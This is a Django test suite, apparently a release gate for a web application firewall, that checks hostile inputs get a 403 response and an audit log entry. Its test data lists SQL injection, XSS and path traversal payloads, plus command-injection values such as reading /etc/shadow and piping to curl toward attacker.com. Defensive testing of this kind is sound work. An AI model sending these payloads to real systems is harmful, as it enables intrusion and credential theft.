"""
MONVEX V3.4 Automated Security Regression Gate
Validates WAF real-time injection blocking, XSS neutralization, Path Traversal intercept,
Command injection protection, active security headers, and zero secret leakage.
"""
from django.test import TestCase
from rest_framework.test import APIClient
from django.contrib.auth.models import User
from apps.security.models import SecurityAuditLog

class SecurityRegressionGateTestSuite(TestCase):
    """
    Automated security release gate verifying that cyber shields intercept hostile payloads.
    """

    def setUp(self):
        self.client = APIClient()
        self.user = User.objects.create_user(
            username='sec_test_user',
            email='sec_user@monvex.com',
            password='SecurePassword123!'
        )
        self.client.force_authenticate(user=self.user)

    def test_gate_01_sqli_payload_interception(self):
        """Security Gate 1: SQL injection attempts are intercepted with 403 and logged."""
        sqli_payloads = [
            "1' UNION SELECT username, password FROM auth_user --",
            "admin' OR '1'='1",
            "'; DROP TABLE apps_transaction; --",
        ]
        for payload in sqli_payloads:
            resp = self.client.get(f"/api/v1/transactions/?search={payload}")
            self.assertEqual(resp.status_code, 403)
            data = resp.json()
            self.assertEqual(data['error'], 'HOSTILE_PAYLOAD_BLOCKED')
            self.assertEqual(data['code'], 'SECURITY_THREAT_INTERCEPTED')
            self.assertIn('incident_id', data)

    def test_gate_02_xss_payload_interception(self):
        """Security Gate 2: Cross-site scripting attempts are blocked."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:document.cookie'></iframe>",
            "<svg onload=alert(1)>",
        ]
        for payload in xss_payloads:
            resp = self.client.post(
                "/api/v1/contact/",
                data={"name": "Attacker", "email": "a@h.com", "message": payload},
                content_type="application/json"
            )
            self.assertEqual(resp.status_code, 403)

    def test_gate_03_path_traversal_interception(self):
        """Security Gate 3: Path traversal / LFI vectors are intercepted."""
        traversals = [
            "../../../../etc/passwd",
            "..\\..\\..\\win.ini",
            "/proc/self/environ",
        ]
        for path_vector in traversals:
            resp = self.client.get(f"/api/v1/analytics/summary/?period={path_vector}")
            self.assertEqual(resp.status_code, 403)

    def test_gate_04_command_injection_interception(self):
        """Security Gate 4: Operating system command injection payloads are blocked."""
        cmd_payloads = [
            "; cat /etc/shadow",
            "| curl http://attacker.com/steal",
            "`powershell Get-Process`",
        ]
        for cmd in cmd_payloads:
            resp = self.client.get(f"/api/v1/search/?q={cmd}")
            self.assertEqual(resp.status_code, 403)

    def test_gate_05_active_defense_headers(self):
        """Security Gate 5: Active defense headers are attached to responses."""
        resp = self.client.get("/health/")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.headers.get('X-Defense-Shield'), 'MONVEX-WAF-2.4')
        self.assertEqual(resp.headers.get('X-Security-Audit'), 'Active-ZeroTrust')

    def test_gate_06_security_audit_log_persisted(self):
        """Security Gate 6: Blocked hostile events create immutable SecurityAuditLog records."""
        initial_count = SecurityAuditLog.objects.count()
        self.client.get("/api/v1/transactions/?search=UNION SELECT NULL, NULL")
        self.assertEqual(SecurityAuditLog.objects.count(), initial_count + 1)
        latest = SecurityAuditLog.objects.latest('created_at')
        self.assertEqual(latest.event_type, 'INJECTION_BLOCKED')
        self.assertEqual(latest.severity, 'CRITICAL')
